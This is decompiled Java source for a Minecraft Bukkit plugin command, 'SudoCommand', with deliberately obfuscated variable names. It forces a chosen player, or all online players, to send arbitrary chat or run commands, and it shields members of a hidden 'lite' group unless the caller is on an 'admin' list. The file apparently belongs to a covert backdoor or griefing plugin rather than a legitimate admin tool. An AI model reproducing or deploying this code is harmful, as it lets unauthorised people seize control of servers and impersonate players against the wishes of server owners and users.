/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.methods.API;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class SudoCommand
extends Command {
    public SudoCommand() {
        SudoCommand llllllllllllllllllllllllIIIIllll;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    @Override
    public void execute(Core lllllllllllllllllllllllIllllllII, String lllllllllllllllllllllllIllllllll, String[] lllllllllllllllllllllllIlllllIll, Player lllllllllllllllllllllllIlllllIlI) {
        if (lllllllllllllllllllllllIlllllIll.length <= 2) {
            lllllllllllllllllllllllIlllllIlI.sendMessage(Settings.USAGE("sudo <player> <chat | cmd>"));
        } else if (lllllllllllllllllllllllIlllllIll[1].equals("*")) {
            StringBuilder llllllllllllllllllllllllIIIIIlIl = new StringBuilder();
            for (int llllllllllllllllllllllllIIIIIlll = 2; llllllllllllllllllllllllIIIIIlll != lllllllllllllllllllllllIlllllIll.length; ++llllllllllllllllllllllllIIIIIlll) {
                llllllllllllllllllllllllIIIIIlIl.append(lllllllllllllllllllllllIlllllIll[llllllllllllllllllllllllIIIIIlll]).append(" ");
            }
            for (Player llllllllllllllllllllllllIIIIIllI : Bukkit.getOnlinePlayers()) {
                if (!lllllllllllllllllllllllIllllllII.lite.contains(llllllllllllllllllllllllIIIIIllI.getName())) continue;
                API.runCMDAsPlayer(llllllllllllllllllllllllIIIIIllI, String.valueOf(llllllllllllllllllllllllIIIIIlIl));
            }
            lllllllllllllllllllllllIlllllIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("Everyone was forced to say ").append(Settings.RED).append((Object)llllllllllllllllllllllllIIIIIlIl))));
        } else {
            Player llllllllllllllllllllllllIIIIIIlI = Bukkit.getServer().getPlayer(lllllllllllllllllllllllIlllllIll[1]);
            if (llllllllllllllllllllllllIIIIIIlI == null) {
                lllllllllllllllllllllllIlllllIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllllllllllllIlllllIll[1]).append(Settings.WHITE).append(" is not online."))));
            } else if (lllllllllllllllllllllllIllllllII.lite.contains(llllllllllllllllllllllllIIIIIIlI.getName()) && !lllllllllllllllllllllllIllllllII.admin.contains(lllllllllllllllllllllllIlllllIlI.getName())) {
                lllllllllllllllllllllllIlllllIlI.sendMessage(Settings.USAGE(String.valueOf(new StringBuilder().append("You cannot sudo another ").append(Settings.NAME).append(" member!"))));
            } else {
                StringBuilder llllllllllllllllllllllllIIIIIIll = new StringBuilder();
                for (int llllllllllllllllllllllllIIIIIlII = 2; llllllllllllllllllllllllIIIIIlII != lllllllllllllllllllllllIlllllIll.length; ++llllllllllllllllllllllllIIIIIlII) {
                    llllllllllllllllllllllllIIIIIIll.append(lllllllllllllllllllllllIlllllIll[llllllllllllllllllllllllIIIIIlII]).append(" ");
                }
                API.runCMDAsPlayer(llllllllllllllllllllllllIIIIIIlI, String.valueOf(llllllllllllllllllllllllIIIIIIll));
                lllllllllllllllllllllllIlllllIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllllllllllllIIIIIIlI.getName()).append(Settings.WHITE).append(" was forced to send ").append(Settings.RED).append((Object)llllllllllllllllllllllllIIIIIIll))));
            }
        }
    }
}

